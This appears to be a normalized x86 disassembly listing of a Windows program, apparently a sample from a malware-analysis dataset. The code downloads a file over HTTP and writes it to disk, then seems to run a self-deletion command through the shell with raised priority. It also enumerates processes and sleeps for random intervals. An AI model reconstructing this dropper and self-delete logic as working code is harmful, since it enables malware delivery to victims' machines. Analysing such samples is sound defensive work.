push [ ebp + 0x8 ]
call [ sscanf@IAT ]
add esp 0x14
cmp eax 0x3
jne r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push rw-data
call [ InternetOpenA@IAT ]
mov esi eax
cmp esi ebx
mov [ ebp - 0x8 ] esi
je r-xdata
push ebx
push __dos_header
mov eax rw-data
push 0x3
push eax
push eax
lea eax [ ebp - 0x60 ]
push ebx
push eax
push esi
call [ InternetConnectA@IAT ]
cmp eax ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push ebx
push 0x4000000
push rw-data
push ebx
lea ecx [ ebp - 0xa0 ]
push rw-data
push ecx
push rw-data
push eax
call [ HttpOpenRequestA@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
push esi
call [ InternetCloseHandle@IAT ]
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push edi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push [ ebp + 0x8 ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp + 0x8 ]
call esi
push [ ebp - 0x8 ]
mov esi [ HttpQueryInfoA@IAT ]
lea eax [ ebp - 0xc ]
push ebx
push eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] 0x10
push eax
push 0x13
push edi
call esi
lea eax [ ebp - 0x20 ]
push eax
call [ atoi@IAT ]
cmp eax 0x194
pop ecx
jne r-xdata
call esi
lea eax [ ebp - 0xc ]
push ebx
push eax
lea eax [ ebp - 0xc0 ]
push eax
push 0x5
push edi
mov [ ebp - 0xc ] 0x20
call esi
lea eax [ ebp - 0xc0 ]
push eax
call [ atol@IAT ]
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push edi
call [ InternetReadFile@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
mov esi [ InternetCloseHandle@IAT ]
push edi
call esi
push [ ebp + 0x8 ]
call esi
push [ ebp - 0x8 ]
call esi
mov eax ebx
jmp r-xdata
lea eax [ ebp - 0x2c0 ]
push 0x200
push eax
lea eax [ ebp - 0x2c0 ]
push eax
call [ GetLongPathNameA@IAT ]
lea eax [ ebp - 0x2c0 ]
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
pop ecx
cmp esi ebx
pop ecx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
push 0x1
pop ebx
jmp r-xdata
push esi
push [ ebp - 0x4 ]
push 0x1
push [ ebp - 0x10 ]
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
push esi
call [ fclose@IAT ]
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
add esp 0x1c
sub_402426
push ebp
mov ebp esp
sub esp 0x63c
push ebx
push esi
mov esi 0x104
push edi
lea eax [ ebp - 0x23c ]
push esi
xor edi edi
push eax
push edi
call [ GetModuleFileNameA@IAT ]
lea eax [ ebp - 0x23c ]
push esi
push eax
lea eax [ ebp - 0x23c ]
push eax
call [ GetShortPathNameA@IAT ]
lea eax [ ebp - 0x63c ]
push esi
push eax
push rw-data
call [ GetEnvironmentVariableA@IAT ]
lea eax [ ebp - 0x43c ]
push rw-data
push eax
call [ lstrcpyA@IAT ]
mov esi [ lstrcatA@IAT ]
lea eax [ ebp - 0x23c ]
push eax
lea eax [ ebp - 0x43c ]
push eax
call esi
lea eax [ ebp - 0x43c ]
push rw-data
push eax
call esi
lea eax [ ebp - 0x63c ]
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x43c ]
mov [ ebp - 0x24 ] edi
mov [ ebp - 0x20 ] edi
mov edi [ GetCurrentProcess@IAT ]
push 0x100
mov [ ebp - 0x3c ] 0x3c
mov [ ebp - 0x38 ] 0x40
mov [ ebp - 0x30 ] rw-data
mov [ ebp - 0x28 ] eax
call edi
mov esi [ SetPriorityClass@IAT ]
push eax
call esi
mov ebx [ GetCurrentThread@IAT ]
push 0xf
call ebx
push eax
call [ SetThreadPriority@IAT ]
lea eax [ ebp - 0x3c ]
push eax
call [ ShellExecuteExA@IAT ]
test eax eax
je r-xdata
push 0x20
call edi
push eax
call esi
push 0x0
call ebx
push eax
call [ SetThreadPriority@IAT ]
xor eax eax
push 0x40
push [ ebp - 0x4 ]
call esi
push 0x1
push [ ebp - 0x4 ]
call [ SetProcessPriorityBoost@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_40253b
push esi
xor esi esi
cmp [ esp + 0xc ] esi
push edi
mov edi [ esp + 0xc ]
jle r-xdata
and [ esi + edi + 0x1 ] 0x0
mov eax edi
pop edi
pop esi
retn
call [ rand@IAT ]
push 0x1a
cdq
pop ecx
idiv ecx
add dl 0x41
mov [ esi + edi ] dl
inc esi
cmp esi [ esp + 0x10 ]
jl r-xdata
sub_4025c0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_40277b
cmp [ rw-data ] ebx
jne r-xdata
call sub_402766
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402778
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
sub_40256c
call [ rand@IAT ]
push 0x9
cdq
pop ecx
idiv ecx
cmp edx 0x7
jge r-xdata
imul edx edx 0x3e8
push edx
call [ Sleep@IAT ]
retn
add edx 0x6
Process32Next
jmp [ Process32Next@IAT ]
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32First
jmp [ Process32First@IAT ]
strcat
jmp [ strcat@IAT ]
strcmp
jmp [ strcmp@IAT ]
strlen
jmp [ strlen@IAT ]
strcpy
jmp [ strcpy@IAT ]
memset
jmp [ memset@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402766
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402778
xor eax eax
retn
sub_40277b
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
